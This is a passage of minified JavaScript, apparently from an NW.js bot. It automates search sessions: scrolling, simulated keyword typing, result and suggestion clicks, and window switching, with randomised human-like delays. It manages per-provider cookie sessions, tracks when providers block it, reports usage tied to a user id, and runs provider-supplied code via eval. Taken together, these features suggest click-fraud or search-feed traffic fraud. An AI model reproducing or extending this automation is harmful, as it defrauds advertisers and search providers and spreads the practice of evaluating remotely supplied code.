								scroll: {
									chance: context.flowConfig.actions.landingPageActions.scroll.chance,
									timeBeforeRun: context.flowConfig.actions.landingPageActions.scroll.timeBeforeRun,
									canPlay: function(e, t, o, n) {
										try {
											return !(t && t.specialElements && Array.isArray(t.specialElements) && t.specialElements.length > 0)
										} catch (e) {
											return !1
										}
									},
									act: function(e, t, o, n) {
										if (e && void 0 !== e.actionsPerformed && (e.actionsPerformed += 1), context.prov && context.prov.debug && context.prov.debug.logs && 1 == context.prov.debug.logs.landingPageActions && ally.reportFeedLog(LOG_TYPE.FEED_SESSION, LOG_LEVELS.DEBUG, context, ["actions", "landingPageActions", "scroll", e.windowId]), e.nwWindow && e.nwWindow.window && e.nwWindow.window.document) {
											var r = {
												min: 2,
												max: 8
											};
											context.flowConfig.actions.landingPageActions.scroll.timeToProceedAfterScroll && null != typeof context.flowConfig.actions.landingPageActions.scroll.timeToProceedAfterScroll.min && null != typeof context.flowConfig.actions.landingPageActions.scroll.timeToProceedAfterScroll.max && (r = context.flowConfig.actions.landingPageActions.scroll.timeToProceedAfterScroll);
											var i = e.nwWindow.window.document.getElementsByTagName("a");
											if (context.flowConfig.actions.landingPageActions.scroll.generateFromResults && t && t.res && t.res.length > 0 && (i = t.res.map((function(e) {
													return Array.from(e.getElementsByTagName("a"))
												})).reduce((function(e, t) {
													return e.concat(t)
												}), [])), i.length < 1) 0 == ("function" == typeof context.prov._canParse && context.prov._canParse(e.nwWindow.window.document)) ? (ally.reportFeedLog(LOG_TYPE.SCRIPT, LOG_LEVELS.WARNING, context, ["actions", "landingPage", "scroll", "cant_parse", "toclose"]), landingPageActions.close.act(e)) : proceedToLandingPageAction(landingPageActions, t, o, n, e);
											else {
												var a = Math.floor(randomize(1, 100 * jen.generateElementForScroll_percisionFactor));
												context.flowConfig.actions.landingPageActions.scroll.generateElementNotInViewPort, jen.generateElementForScroll_percisionFactor;
												var c = i[Math.floor(randomize(0, i.length - 1))];
												if (a <= context.flowConfig.actions.landingPageActions.scroll.generateElementNotInViewPort * jen.generateElementForScroll_percisionFactor && Array.from(i).filter((function(t) {
														return 0 == devar.isElementInViewport(t, e.nwWindow.window.document)
													})).length > 0)
													for (; 1 == devar.isElementInViewport(c, e.nwWindow.window.document);) c = i[Math.floor(randomize(0, i.length - 1))];
												context.fallbackNotReloadingTimeout && (global.clearTimeout(context.fallbackNotReloadingTimeout), context.fallbackNotReloadingTimeout = null), noa.digiscrollimate(c, kwl.domainsElementsClassNames, e.nwWindow.window.document, e.nwWindow, context.flowConfig.scrollingSpeed, 1, (function() {
													if (context.fallbackNotReloadingTimeout && (global.clearTimeout(context.fallbackNotReloadingTimeout), context.fallbackNotReloadingTimeout = null), null == context.fallbackNotReloadingTimeout) {
														var i = randomize(r.min, r.max);
														context.fallbackNotReloadingTimeout = global.setTimeout((function() {
															proceedToLandingPageAction(landingPageActions, t, o, n, e)
														}), 1e3 * i)
													}
												}))
											}
										} else landingPageActions.close.act(e)
									}
								},
								fos: {
									chance: context.flowConfig.actions.landingPageActions.fos.chance,
									timeBeforeRun: context.flowConfig.actions.landingPageActions.fos.timeBeforeRun,
									canPlay: function(e, t, o, n) {
										try {
											return !(t && t.specialElements && Array.isArray(t.specialElements) && t.specialElements.length > 0) && (!(context.fosAmountPerformed >= context.fosAmount) && 0 == landingPageActions.click.canPlay(e, t, o, n))
										} catch (e) {
											return !1
										}
									},
									act: function(e, t, o, n) {
										if (e && void 0 !== e.actionsPerformed && (e.actionsPerformed += 1), context.prov && context.prov.debug && context.prov.debug.logs && 1 == context.prov.debug.logs.landingPageActions && ally.reportFeedLog(LOG_TYPE.FEED_SESSION, LOG_LEVELS.DEBUG, context, ["actions", "landingPageActions", "fos", e.windowId]), 0 == landingPageActions.fos.canPlay(e, t, o, n)) return context.fallbackNotReloadingTimeout && (global.clearTimeout(context.fallbackNotReloadingTimeout), context.fallbackNotReloadingTimeout = null), void(null == context.fallbackNotReloadingTimeout && (context.fallbackNotReloadingTimeout = global.setTimeout((function() {
											proceedToLandingPageAction(landingPageActions, t, o, n, e)
										}), 1e3 * randomize(1, 2))));

										function r() {
											for (let e in context.prov.groupIds) {
												let t = context.prov.groupIds[e];
												context.sessionContextOwner.kwl.provGroupsConfig[t].fos[context.chosenPerformingWay].countTowardGroupsCap && slash.pushVioletExecution([t], context.sessionContextOwner.kwl.provGroupsConfig)
											}
											context.nextKwText = devar.getNextGeneratedKW(context, context.nextKWSource, t, context.prov.fosConfiguration.nextKWSource[context.nextKWSource]), context.isScrambled = !1, context.originalKW = context.nextKwText, context.manipulatedKW = context.nextKwText, context.scrambledKW = context.nextKwText;
											var o = devar.getSearchElement(kwl.domainsElementsClassNames, e.nwWindow.window.document),
												n = devar.getSearchButton(kwl.domainsElementsClassNames, e.nwWindow.window.document),
												r = o.value;
											null == r && (r = ""), noa.digiscrollimate(o, kwl.domainsElementsClassNames, e.nwWindow.window.document, e.nwWindow, context.flowConfig.scrollingSpeed, 5, (function() {
												var t = BOCompatible ? smoothTouch : touchRes;
												t(o, e, (function() {
													momo.tryGetWindowByContext(e) && momo.tryGetWindowByContext(e).document && global.setTimeout((function() {
														try {
															var i = devar.getSearchSuggestions(kwl.domainsElementsClassNames, e.nwWindow.window.document),
																a = jen.generateSearchPerformWay(context);
															if (0 == i.length || "randomSuggestionMouseClick" != a) {
																var c = rachel.getTypings(r, context.nextKwText);
																if (0 == noa.isKPC(context, e.nwWindow) && (o.removeEventListener("keydown", devar.appendToTextElement, !0), o.addEventListener("keydown", devar.appendToTextElement, !0)), context.executionState >= STATES.FINISHED) return;
																rachel.performTypings(context, e, c, o, e.nwWindow.window.document, (function() {
																	if (context.kw = o.value, ally.monitoringObj.fillQuery(context), !(context.executionState >= STATES.FINISHED) && momo.tryGetWindowByContext(e) && momo.tryGetWindowByContext(e).document) {
																		var t = randomize(1, 2);
																		global.setTimeout((function() {
																			var t = BOCompatible ? smoothTouch : touchRes;
																			if ("enterKeyPress" == a && KEYPRESSCompatible && noa.isKPC(context, e.nwWindow)) try {
																				scptNWWindowAPI.keypress(e.nwWindow, enums.keyboard.ENTER, enums.keyboardModifiers.kNoModifiers), context.prov && context.prov.debug && context.prov.debug.logs && 1 == context.prov.debug.logs.searchBarPerformingWay && ally.reportFeedLog(LOG_TYPE.FEED_SESSION, LOG_LEVELS.DEBUG, context, ["fos", "searchBar", "performingWay", "enterKeyPress", e.windowId]), e.phaser = 1, afterSearchPerformedCallback(e)
																			} catch (o) {
																				context.prov && context.prov.debug && context.prov.debug.logs && 1 == context.prov.debug.logs.searchBarPerformingWay && ally.reportFeedLog(LOG_TYPE.FEED_SESSION, LOG_LEVELS.DEBUG, context, ["fos", "searchBar", "performingWay", "searchButtonMouseClick", e.windowId]), t(n, e, (function() {
																					e.phaser = 1, afterSearchPerformedCallback(e)
																				}))
																			} else context.prov && context.prov.debug && context.prov.debug.logs && 1 == context.prov.debug.logs.searchBarPerformingWay && ally.reportFeedLog(LOG_TYPE.FEED_SESSION, LOG_LEVELS.DEBUG, context, ["fos", "searchBar", "performingWay", "searchButtonMouseClick", e.windowId]), t(n, e, (function() {
																				e.phaser = 1, afterSearchPerformedCallback(e)
																			}))
																		}), 1e3 * t)
																	}
																}))
															} else context.prov && context.prov.debug && context.prov.debug.logs && 1 == context.prov.debug.logs.searchBarPerformingWay && ally.reportFeedLog(LOG_TYPE.FEED_SESSION, LOG_LEVELS.DEBUG, context, ["fos", "searchBar", "performingWay", "randomSuggestionMouseClick", e.windowId]), ally.monitoringObj.fillQuery(context), global.setTimeout((function() {
																t(pickRandomItem(i), e, (function() {
																	e.phaser = 1, afterSearchPerformedCallback(e)
																}))
															}), randomize(100, 5e3))
														} catch (e) {}
													}), randomize(1e3, 3e3))
												}))
											}))
										}
										if (context.fosAmountPerformed += 1, context.nextKwText = context.kw, context.chosenPerformingWay = jen.generateFosPerformingWay(momo.getFosPerformingWay(context)), reportPageView("fos/way/" + scriptVersion + "/" + momo.tryGetProviderId(context) + "/" + (context.executionFlow ? context.executionFlow : "unknown") + "/" + context.chosenPerformingWay + "/" + getApplicationActionString(), frisitor), ally.reportFeedLog(LOG_TYPE.SCRIPT, LOG_LEVELS.DEBUG, context, ["fos", "way", context.chosenPerformingWay]), 0 == context.nextKWSourceLock && (context.nextKWSource = jen.generateNextKwSource(momo.getFosNextKWSource(context))), "newNavigation" == context.chosenPerformingWay) {
											if (context.nextKwText = devar.getNextGeneratedKW(context, context.nextKWSource, t, context.prov.fosConfiguration.nextKWSource[context.nextKWSource]), context.isScrambled = !1, context.originalKW = context.nextKwText, context.manipulatedKW = context.nextKwText, context.scrambledKW = context.nextKwText, context.kw = context.nextKwText, ally.monitoringObj.fillQuery(context), !e.nwWindow || !e.nwWindow.window || !e.nwWindow.window.document) return;
											context.prov._canParse = null, e.phaser = 2, e.oldLoc = null, e.isResAvailable = !1, context.monitoringObject.flow.callsToProviderUrl = context.monitoringObject.flow.callsToProviderUrl + 1, e.nwWindow.window.location = momo.getFinalUrl(context, context.nextKwText);
											for (let e in context.prov.groupIds) {
												let t = context.prov.groupIds[e];
												context.sessionContextOwner.kwl.provGroupsConfig[t].fos[context.chosenPerformingWay].countTowardGroupsCap && slash.pushVioletExecution([t], context.sessionContextOwner.kwl.provGroupsConfig)
											}
											e.phaser = 1, afterSearchPerformedCallback(e)
										} else if ("resultClick" == context.chosenPerformingWay) {
											var i = jen.generateResCategory(context.prov.fosConfiguration.way[context.chosenPerformingWay].resultsChances, null, momo.getFactorConfig(context));
											if ("res" == i && (i = "rel"), !t || !t[i] || 0 == Array.isArray(t[i]) || t[i].length <= 0) return ally.reportFeedLog(LOG_TYPE.FEED_SESSION, LOG_LEVELS.WARNING, context, ["fos", "way_fallback", "searchBar"]), void r();
											var a = Math.floor(randomize(0, t[i].length - 1));
											context.nextKwText = t[i][a].innerText || t[i][a].textContent, context.nextKwText || reportPageView("error/fos/resClk/kwEm/" + scriptVersion + "/" + momo.tryGetProviderId(context) + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid"), frisitor), context.isScrambled = !1, context.originalKW = context.nextKwText, context.manipulatedKW = context.nextKwText, context.scrambledKW = context.nextKwText, context.kw = context.nextKwText, ally.monitoringObj.fillQuery(context), landingPageActions.click.act(e, t, t[i], a);
											for (let e in context.prov.groupIds) {
												let t = context.prov.groupIds[e];
												context.sessionContextOwner.kwl.provGroupsConfig[t].fos[context.chosenPerformingWay].countTowardGroupsCap[i] && slash.pushVioletExecution([t], context.sessionContextOwner.kwl.provGroupsConfig)
											}
											afterSearchPerformedCallback(e)
										} else if ("newWindow" == context.chosenPerformingWay) {
											if (context.nextKwText = devar.getNextGeneratedKW(context, context.nextKWSource, t, context.prov.fosConfiguration.nextKWSource[context.nextKWSource]), context.isScrambled = !1, context.originalKW = context.nextKwText, context.manipulatedKW = context.nextKwText, context.scrambledKW = context.nextKwText, context.kw = context.nextKwText, ally.monitoringObj.fillQuery(context), navigator.onLine && nw.Window.open) {
												let e = momo.getFinalUrl(context, context.nextKwText);
												context.monitoringObject.flow.callsToProviderUrl = context.monitoringObject.flow.callsToProviderUrl + 1, nw.Window.open(e, newWindowOptions, wndStart)
											}
											context.wordsAmount = context.nextKwText.split(" ").length, context.clicksAmount = jen.generateClicks(context), context.clicksPerformed = 0, context.searchesAmount += 1;
											for (let e in context.prov.groupIds) {
												let t = context.prov.groupIds[e];
												context.sessionContextOwner.kwl.provGroupsConfig[t].fos[context.chosenPerformingWay].countTowardGroupsCap && slash.pushVioletExecution([t], context.sessionContextOwner.kwl.provGroupsConfig)
											}
										} else r()
									}
								},
								switch: {
									chance: context.flowConfig.actions.landingPageActions.switch.chance,
									timeBeforeRun: context.flowConfig.actions.landingPageActions.switch.timeBeforeRun,
									canPlay: function(e, t, o, n) {
										try {
											return context && Array.isArray(context.ruggedContexts) && context.ruggedContexts.length > 0
										} catch (e) {
											return !1
										}
									},
									act: function(e) {
										if (e && void 0 !== e.actionsPerformed && (e.actionsPerformed += 1), context.prov && context.prov.debug && context.prov.debug.logs && 1 == context.prov.debug.logs.landingPageActions && ally.reportFeedLog(LOG_TYPE.FEED_SESSION, LOG_LEVELS.DEBUG, context, ["actions", "landingPageActions", "switch", e.windowId]), !e.nwWindow || !e.nwWindow.window || !e.nwWindow.window.document) return consolw.warn("null window context received! closing session"), void landingPageActions.close.act(e);
										var t = {
											min: 2,
											max: 8
										};
										context.flowConfig.actions.landingPageActions.switch.timeToProceedAfterSwitch && null != typeof context.flowConfig.actions.landingPageActions.switch.timeToProceedAfterSwitch.min && null != typeof context.flowConfig.actions.landingPageActions.switch.timeToProceedAfterSwitch.max && (t = context.flowConfig.actions.landingPageActions.switch.timeToProceedAfterSwitch), context.fallbackNotReloadingTimeout && (global.clearTimeout(context.fallbackNotReloadingTimeout), context.fallbackNotReloadingTimeout = null);
										var o = jen.generateDifferentWindowContext(context, e);
										if (context.activeWindowContext = o, context.fallbackNotReloadingTimeout && (global.clearTimeout(context.fallbackNotReloadingTimeout), context.fallbackNotReloadingTimeout = null), null == context.fallbackNotReloadingTimeout) {
											var n = randomize(t.min, t.max);
											context.fallbackNotReloadingTimeout = global.setTimeout((function() {
												loadedFuncStarter(o, context)
											}), 1e3 * n)
										}
									}
								},
								closeWindow: {
									chance: context.flowConfig.actions.landingPageActions.closeWindow.chance,
									timeBeforeRun: context.flowConfig.actions.landingPageActions.closeWindow.timeBeforeRun,
									canPlay: function(e, t, o, n) {
										try {
											return context && Array.isArray(context.ruggedContexts) && context.ruggedContexts.length > 0
										} catch (e) {
											return !1
										}
									},
									act: function(e) {
										if (e && void 0 !== e.actionsPerformed && (e.actionsPerformed += 1), context.prov && context.prov.debug && context.prov.debug.logs && 1 == context.prov.debug.logs.landingPageActions && ally.reportFeedLog(LOG_TYPE.FEED_SESSION, LOG_LEVELS.DEBUG, context, ["actions", "landingPageActions", "closeWindow", e.windowId]), !e.nwWindow || !e.nwWindow.window || !e.nwWindow.window.document) return consolw.warn("null window context received! closing session"), void landingPageActions.close.act(e);
										var t = {
											min: 2,
											max: 8
										};
										context.flowConfig.actions.landingPageActions.closeWindow.timeToProceedAfterCloseWindow && null != typeof context.flowConfig.actions.landingPageActions.closeWindow.timeToProceedAfterCloseWindow.min && null != typeof context.flowConfig.actions.landingPageActions.closeWindow.timeToProceedAfterCloseWindow.max && (t = context.flowConfig.actions.landingPageActions.closeWindow.timeToProceedAfterCloseWindow), context.fallbackNotReloadingTimeout && (global.clearTimeout(context.fallbackNotReloadingTimeout), context.fallbackNotReloadingTimeout = null);
										var o = pickRandomItem(context.ruggedContexts);
										if (momo.tryCloseSpecificWnd(context, o), context.fallbackNotReloadingTimeout && (global.clearTimeout(context.fallbackNotReloadingTimeout), context.fallbackNotReloadingTimeout = null), null == context.fallbackNotReloadingTimeout) {
											var n = randomize(t.min, t.max);
											context.fallbackNotReloadingTimeout = global.setTimeout((function() {
												executeResRock(o = jen.generateDifferentWindowContext(context, e))
											}), 1e3 * n)
										}
									}
								},
								close: {
									chance: context.flowConfig.actions.landingPageActions.close.chance,
									timeBeforeRun: context.flowConfig.actions.landingPageActions.close.timeBeforeRun,
									canPlay: function(e, t, o, n) {
										try {
											if (context.prov && 1 == context.flowConfig.waitForExitPage) {
												var r = devar.isUrlMatchingSomeRegex(e.nwWindow.window.document, context.flowConfig.exitPageRegexUrl);
												if (!1 === r) return !1;
												if (!0 === r) return !0
											}
											return 0 == landingPageActions.click.canPlay(e, t, o, n) && 0 == landingPageActions.fos.canPlay(e, t, o, n)
										} catch (e) {
											return !0
										}
									},
									act: function(e, t, o, n) {
										e && void 0 !== e.actionsPerformed && (e.actionsPerformed += 1), context.prov && context.prov.debug && context.prov.debug.logs && 1 == context.prov.debug.logs.landingPageActions && ally.reportFeedLog(LOG_TYPE.FEED_SESSION, LOG_LEVELS.DEBUG, context, ["actions", "landingPageActions", "close", e.windowId]), momo.tryCloseSmoothWnd(context)
									}
								}
							};
						if (context.monitoringObject.flow.factor_id = context.violet.factor_id, context.monitoringObject.flow.prov_suffix = momo.getFactorConfig(context).provIdSuffix, context.monitoringObject.flow.factorAmount = momo.getFactorConfig(context).factor, context.monitoringObject.flow.provider_id = context.prov.id, context.monitoringObject.flow.full_provider_id = momo.tryGetProviderId(context), context.monitoringObject.flow.flowName = context.executionFlow, context.monitoringObject.flow.fosAmountGenerated = context.fosAmount, context.monitoringObject.flow.queries = [], context.executionState >= STATES.ON_IS_FLOW_COOKIEFIED) return void ally.reportFeedLog(LOG_TYPE.SCRIPT, LOG_LEVELS.WARNING, context, ["executionState", "alreadyReached", STATES.ON_IS_FLOW_COOKIEFIED.toString()]);
						context.executionState = STATES.ON_IS_FLOW_COOKIEFIED;
						let e = 0;
						context.prov.spaceFreq && context.prov.spaceFreq.beforeExecution && context.prov.spaceFreq.beforeExecution.min && context.prov.spaceFreq.beforeExecution.max && (e = randomize(context.prov.spaceFreq.beforeExecution.min, context.prov.spaceFreq.beforeExecution.max)), global.setTimeout((function() {
							context.isFlowCookiefied ? CM.getCurrentSession((function(e) {
								e ? CM.saveSession("root", e, (function(t) {
									if (t) reportPageView("error/CM.saveSession/" + scriptVersion + "/" + momo.tryGetProviderId(context) + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid"), frisitor), context.isFlowCookiefied = !1, wndSetup();
									else {
										var o = !1;
										context && context.prov && context.prov.debug && context.prov.debug.cm && "boolean" == typeof context.prov.debug.cm.clearAlsoWhitelist && (o = context.prov.debug.cm.clearAlsoWhitelist), CM.clearCurrentSession(e, (function(e) {
											if (e)
												if (-1 != CM.cookieMap().indexOf(momo.tryGetProviderId(context))) {
													var t = !1;
													if (context.flowConfig.cm.resetRate) {
														Math.floor(randomize(1, 1e4));
														100 * context.flowConfig.cm.resetRate > Math.floor(randomize(1, 1e4)) && (t = !0)
													}
													1 == t ? (CM.deleteSession(momo.tryGetProviderId(context)), reportPageView("cookies/forceReset/" + scriptVersion + "/" + momo.tryGetProviderId(context) + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid"), frisitor), wndSetup()) : CM.loadSession(momo.tryGetProviderId(context), (function(e, t) {
														t ? (reportPageView("error/CM.loadSession/reset/" + scriptVersion + "/" + momo.tryGetProviderId(context) + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid") + "/" + t, frisitor), CM.deleteSession(momo.tryGetProviderId(context)), wndSetup()) : CM.setCurrentSession(e, (function(e) {
															e && (reportPageView("error/CM.setCurrentSession/reset/" + scriptVersion + "/" + momo.tryGetProviderId(context) + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid") + "/" + e, frisitor), CM.deleteSession(momo.tryGetProviderId(context))), wndSetup()
														}))
													}))
												} else wndSetup();
											else reportPageView("error/CM.clearCurrentSession/" + scriptVersion + "/" + momo.tryGetProviderId(context) + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid"), frisitor), context.isFlowCookiefied = !1, wndSetup()
										}), o)
									}
								})) : (reportPageView("error/CM.getCurrentSession1/" + scriptVersion + "/" + momo.tryGetProviderId(context) + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid"), frisitor), context.isFlowCookiefied = !1, wndSetup())
							})) : (reportPageView("error/CM.getCurrentSession2/" + scriptVersion + "/" + momo.tryGetProviderId(context) + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid"), frisitor), wndSetup())
						}), e)
					} catch (e) {
						reportPageView("error/instance/" + scriptVersion + "/" + momo.tryGetProviderId(context) + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid") + "/" + e.stack, frisitor), advance(!1, context)
					}
				}

				function sharkHunter() {
					navigator && !navigator.onLine && (context.executionState = STATES.NO_CONNECTION, context.sharks && 0 == context.sharksNoConnectionReported && (context.sharksNoConnectionReported = !0, ally.reportFeedLog(LOG_TYPE.SCRIPT, LOG_LEVELS.FATAL, context, ["instance", "no_connection"]), reportNoConnection(momo.tryGetProviderId(context))), ally.reportFeedLog(LOG_TYPE.SCRIPT, LOG_LEVELS.FATAL, context, ["instance", "shutdown"]), momo.clearWatchersIntervals(context), slash.clearAllViolets((function() {
						momo.tryCloseSmoothWnd(context)
					})))
				}

				function memWatch() {
					try {
						process.memoryUsage().rss / 1024 / 1024 > MAX_HEAP_SIZE && (context.executionState = STATES.MEMORY_BREACHED, ally.reportFeedLog(LOG_TYPE.SCRIPT, LOG_LEVELS.FATAL, context, ["instance", "memWatch"]), reportPageView("memWatch/" + scriptVersion + "/" + momo.tryGetProviderId(context) + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid") + "/" + process.memoryUsage().rss / 1024 / 1024, frisitor), momo.reportMemWatch(), context.sessionContextOwner.scriptContextOwner.activeSessionId = "MEMWATCH", momo.clearWatchersIntervals(context), momo.tryCloseSmoothWnd(context), momo.startRestartTimeout(context))
					} catch (e) {
						reportPageView("error/memwatch/" + scriptVersion + "/" + momo.tryGetProviderId(context) + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid") + "/" + process.memoryUsage().rss / 1024 / 1024, frisitor)
					}
				}

				function smoothTouch(e, t, o) {
					try {
						var n = null;
						if (devar.isElementVisible(e) && (n = devar.calculateDims(e)), e && (noa.isNCL(context, t.nwWindow) || devar.isRendered(e, t.nwWindow.window.document, context)))
							if (t.isResAvailable = !0, noa.isNCL(context, t.nwWindow)) 0 == ncl(e, kwl.domainsElementsClassNames, n, t.nwWindow.window.document, t.nwWindow, (function() {
								o && "function" == typeof o && o()
							})) && o && "function" == typeof o && o();
							else e.click(), o && "function" == typeof o && o();
						else momo.tryCloseSmoothWnd(context)
					} catch (e) {
						reportPageView("error/smoothTouch/" + scriptVersion + "/" + momo.tryGetProviderId(context) + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid") + "/" + e.stack, frisitor), momo.tryCloseSmoothWnd(context)
					}
				}

				function touchRes(e, t, o) {
					try {
						var n = null;

						function r(e) {
							try {
								if (t.isResAvailable = !0, e.setAttribute("target", "_self"), e.ownerDocument.defaultView != t.nwWindow.window && e.setAttribute("target", "_top"), noa.isNCL(context, t.nwWindow)) return void(0 == ncl(e, kwl.domainsElementsClassNames, n, t.nwWindow.window.document, t.nwWindow, (function() {
									o && "function" == typeof o && o()
								})) && o && "function" == typeof o && o());
								e.click()
							} catch (e) {
								return reportPageView("error/touchres/" + scriptVersion + "/" + momo.tryGetProviderId(context) + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid") + "/" + e.stack, frisitor), void momo.tryCloseSmoothWnd(context)
							}
						}
						devar.isElementVisible(e) && (n = devar.calculateDims(e)), e && (noa.isNCL(context, t.nwWindow) || devar.isRendered(e, t.nwWindow.window.document, context)) ? t.isResAvailable && void 0 !== e.href ? ajax.head(e.href, (function(t) {
							var o = t.getResponseHeader("content-type");
							o && -1 == o.indexOf("text/html") ? (reportPageView("error.ajax.head/" + scriptVersion + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid"), frisitor), momo.tryCloseSmoothWnd(context)) : r(e)
						}), (function(t) {
							r(e)
						})) : r(e) : momo.tryCloseSmoothWnd(context)
					} catch (e) {
						reportPageView("error/touchres/" + scriptVersion + "/" + momo.tryGetProviderId(context) + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid") + "/" + e.stack, frisitor), momo.tryCloseSmoothWnd(context)
					}
				}

				function proceedToLandingPageAction(e, t, o, n, r) {
					try {
						if (r.isResAvailable = !0, momo.overrideAllWnds(context), momo.muteAllWnds(context), !context.strongLock) {
							context.strongLock = !0, r.firstRoamingPage.historyIndex = -1, r.firstRoamingPage.url = "";
							var i = e.click.act,
								a = jen.generateAction(e);
							if (context.prov && void 0 !== context.flowConfig.waitForExitPage && 1 == context.flowConfig.waitForExitPage && devar.isUrlMatchingSomeRegex(r.nwWindow.window.document, context.flowConfig.exitPageRegexUrl)) i = e.close.act;
							else
								for (; e[a] && "function" == typeof e[a].canPlay && 0 == e[a].canPlay(r, t, o, n);) a = jen.generateAction(e);
							i = e[a].act;
							var c = 5,
								s = 30;
							void 0 !== e[a].timeBeforeRun && void 0 !== e[a].timeBeforeRun.start && void 0 !== e[a].timeBeforeRun.end && (c = e[a].timeBeforeRun.start, s = e[a].timeBeforeRun.end);
							var l = randomize(c, s);
							context.actionTime = global.setTimeout((function() {
								try {
									i(r, t, o, n), context.strongLock = !1
								} catch (e) {
									reportPageView("error/action/" + scriptVersion + "/" + momo.tryGetProviderId(context) + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid") + "/" + e.stack, frisitor), momo.tryCloseSmoothWnd(context)
								}
							}), 1e3 * l)
						}
					} catch (e) {
						reportPageView("error/landingpageactions/" + scriptVersion + "/" + momo.tryGetProviderId(context) + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid") + "/" + e.stack, frisitor)
					}
				}

				function resRock(inputWindowContext) {
					if (null == inputWindowContext && (inputWindowContext = momo.tryGetWindowContext(momo.tryGetActiveWindow(context), context)), !(context.executionState >= STATES.FINISHED || 0 == momo.validateFeedSessionTimeout(context)))
						if (void 0 !== context && void 0 !== context.prov) {
							ally.reportSmthwndHostName(context, inputWindowContext.nwWindow), inputWindowContext.isResAvailable = !1;
							try {
								eval("var flow =  " + context.prov.results)
							} catch (e) {
								return reportPageView("error/flow/" + scriptVersion + "/" + momo.tryGetProviderId(context) + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid") + "/" + e.stack, frisitor), void momo.tryCloseSmoothWnd(context)
							}
							var config = [];
							context.flowConfig.resultsConfiguration && (config = context.flowConfig.resultsConfiguration);
							var flowOutput = null;
							try {
								flowOutput = flow(inputWindowContext.nwWindow.window.document, config)
							} catch (e) {
								return reportPageView("error/flow.ex/" + scriptVersion + "/" + momo.tryGetProviderId(context) + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid") + "/" + e.stack, frisitor), void momo.tryCloseSmoothWnd(context)
							}
							if ("retry" == flowOutput) {
								context.prov && context.prov.debug && context.prov.debug.logs && 1 == context.prov.debug.logs.flowOutput && ally.reportFeedLog(LOG_TYPE.FEED_SESSION, LOG_LEVELS.FATAL, context, ["flowOutput", "retry"]), context.prov.resDelay && void 0 !== context.prov.resDelay.min && void 0 !== context.prov.resDelay.max || (reportPageView("warn/incomp/resDelay/" + scriptVersion + "/" + momo.tryGetProviderId(context) + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid"), frisitor), context.prov.resDelay = {
									min: 2e3,
									max: 7e3
								});
								var resDelay = randomize(context.prov.resDelay.min, context.prov.resDelay.max);
								return context.resRockTimeout && (global.clearTimeout(context.resRockTimeout), context.resRockTimeout = null), void(context.resRockTimeout = global.setTimeout(resRock, resDelay, inputWindowContext))
							}
							if ("reload" != flowOutput) {
								if (void 0 === flowOutput || !flowOutput) return context.prov && context.prov.debug && context.prov.debug.logs && 1 == context.prov.debug.logs.flowOutput && ally.reportFeedLog(LOG_TYPE.FEED_SESSION, LOG_LEVELS.FATAL, context, ["flowOutput", "undefined_outputs"]), reportPageView("error/flowOutput/undef/" + scriptVersion + "/" + momo.tryGetProviderId(context) + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid"), frisitor), void(inputWindowContext.nwWindow ? momo.tryCloseSmoothWnd(context) : reportPageView("error/flowOutput/no.res.clo.smwnull/" + scriptVersion + "/" + momo.tryGetProviderId(context) + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid"), frisitor));
								if (flowOutput.block && void 0 !== flowOutput.block && !0 === flowOutput.block.isBlocked) return context.prov && context.prov.debug && context.prov.debug.logs && 1 == context.prov.debug.logs.flowOutput && ally.reportFeedLog(LOG_TYPE.FEED_SESSION, LOG_LEVELS.FATAL, context, ["flowOutput", "blocked"]), inputWindowContext.nwWindow && momo.tryCloseSmoothWnd(context), void reportPageView("flow/blocked/" + flowOutput.block.blocker + "/" + momo.tryGetProviderId(context) + "/" + scriptVersion + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid"), frisitor);
								"function" != typeof context.prov._canParse && "function" == typeof flowOutput.canParse && (context.prov._canParse = flowOutput.canParse);
								var resType = flowOutput.res;
								if (context.resGroup = jen.generateResCategory(context.fosConfig.cats, kwl.lifetime.ctrFactor, momo.getFactorConfig(context)), flowOutput[context.resGroup] && void 0 !== flowOutput[context.resGroup] ? flowOutput[context.resGroup].length <= 0 && (context.prov && context.prov.debug && context.prov.debug.logs && 1 == context.prov.debug.logs.flowOutput && ally.reportFeedLog(LOG_TYPE.FEED_SESSION, LOG_LEVELS.DEBUG, context, ["flowOutput", "noResults_0", context.resGroup]), context.resGroup = "res") : (context.prov && context.prov.debug && context.prov.debug.logs && 1 == context.prov.debug.logs.flowOutput && ally.reportFeedLog(LOG_TYPE.FEED_SESSION, LOG_LEVELS.DEBUG, context, ["flowOutput", "noResults_0", context.resGroup]), context.resGroup = "res"), resType = flowOutput[context.resGroup], !(void 0 !== resType && resType && resType.length && !(resType.length <= 0) || flowOutput && flowOutput.nav && flowOutput.nav.nextPage)) {
									if (flowOutput && flowOutput.ans && !0 === flowOutput.ans.refusedParsingBecauseOfChance) context.refusedParsing = !0, context.prov && context.prov.debug && context.prov.debug.logs && 1 == context.prov.debug.logs.flowOutput && ally.reportFeedLog(LOG_TYPE.FEED_SESSION, LOG_LEVELS.DEBUG, context, ["flowOutput", "refusedParsing"]), reportPageView("flowOutput/refParseRoam/" + flowOutput.ans.landingPage + "/" + momo.tryGetProviderId(context) + "/" + scriptVersion + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid"), frisitor);
